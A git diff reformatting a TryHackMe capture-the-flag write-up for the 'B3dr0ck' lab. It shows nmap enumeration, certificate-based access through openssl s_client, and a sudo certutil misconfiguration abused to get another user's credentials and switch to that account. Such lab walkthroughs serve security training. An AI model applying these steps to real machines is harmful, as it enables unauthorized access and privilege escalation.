@@ -1,11 +1,17 @@
-## Enum
+---
+title: "B3dr0ck"
+date: 2022-09-20T16:00:31+01:00
+draft: false
+categories:
+  - TryHackMe
+---
 
-### rustscan + nmap
+## Enumeration
 
-```
+```bash
 PORT     STATE SERVICE REASON  VERSION
 22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf+D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx+JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8+Ng+31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ+oPW6hcWqD2AoPVmmda82Hir+wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE+wqTZw7/JWC5H9xZqapK3wP9gVn+FGN+3JGHKuYKG6ZGc+eRel2XmIVC2PMelF4j2fY0+M8wMpXsa6MJdiyKnJwHC2V13CIvht+L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p+9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx+bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=
 |   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
@@ -16,19 +22,19 @@ PORT     STATE SERVICE REASON  VERSION
 
 80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
 |_http-title: Did not follow redirect to https://10.10.19.11:4040/
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 
 
 9009/tcp open  pichat? syn-ack
-| fingerprint-strings: 
-|   NULL: 
-|     ____ _____ 
+| fingerprint-strings:
+|   NULL:
+|     ____ _____
 |     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
-|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
-|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
-|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
+|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | |
+|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| |
+|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____
 |     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
 |_    What are you looking for?
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
@@ -92,8 +98,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 | Lu6dGC+Tm4o1gt2oBSlbH4sHkBeP/6eY9v916kx6rHPIzbvf4MY0LVp4T4xo03lb
 | R0khLKD378qOVXe+oANFbY6qEg==
 |_-----END CERTIFICATE-----
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
 |_    Error: 'undefined' is not authorized for access.
 |_ssl-date: TLS randomness does not represent time
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
@@ -132,11 +138,11 @@ First learn about `openssl`
 
 `└──╼ $nc 10.10.19.11 9009`
 
-grab the files and connect: 
+grab the files and connect:
 
 `OpenSSL> s_client -connect 10.10.19.11:54321 -cert certificate -key private_key `
 
-```
+```bash
 b3dr0ck> password
 Password hint: [SIKE! ITS REDACTED!] (user = 'Barney Rubble')
 ```
@@ -144,9 +150,9 @@ No...no it's not a hash...
 
 barney is just that funny
 
-```
+```bash
 barney@b3dr0ck:/home/fred$ sudo -l
-[sudo] password for barney: 
+[sudo] password for barney:
 Matching Defaults entries for barney on b3dr0ck:
 insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -154,7 +160,7 @@ User barney may run the following commands on b3dr0ck:
 (ALL : ALL) /usr/bin/certutil
 ```
 
-```
+```bash
 barney@b3dr0ck:/home/fred$ sudo certutil ls
 
 Current Cert List: (/usr/share/abc/certs)
@@ -174,16 +180,16 @@ drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
 
 Anyway...
 
-```
+```bash
 barney@b3dr0ck:/home/fred$ sudo certutil cat fred.servicekey.pem
 Generating credentials for user: cat (fredservicekeypem)
 Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
 Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
  ...
- 
+
 And once again
 
-```└──╼ $openssl s_client -connect 10.10.19.11:54321 -cert certificate -key private_key 
+```└──╼ $openssl s_client -connect 10.10.19.11:54321 -cert certificate -key private_key
 CONNECTED(00000003)
 ...
 
@@ -192,13 +198,13 @@ Password hint: [LIFE IS NO THAT EZ!] (user = 'fredservicekeypem')
 ```
 switcheroo
 
-```
+```bash
 barney@b3dr0ck:/home/fred$ su fred
-Password: 
+Password:
 fred@b3dr0ck:~$ id
 uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),30(dip),46(plugdev),1002(help)
 ```
-```
+```bash
 fred@b3dr0ck:~$ sudo -l
 Matching Defaults entries for fred on b3dr0ck:
 insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
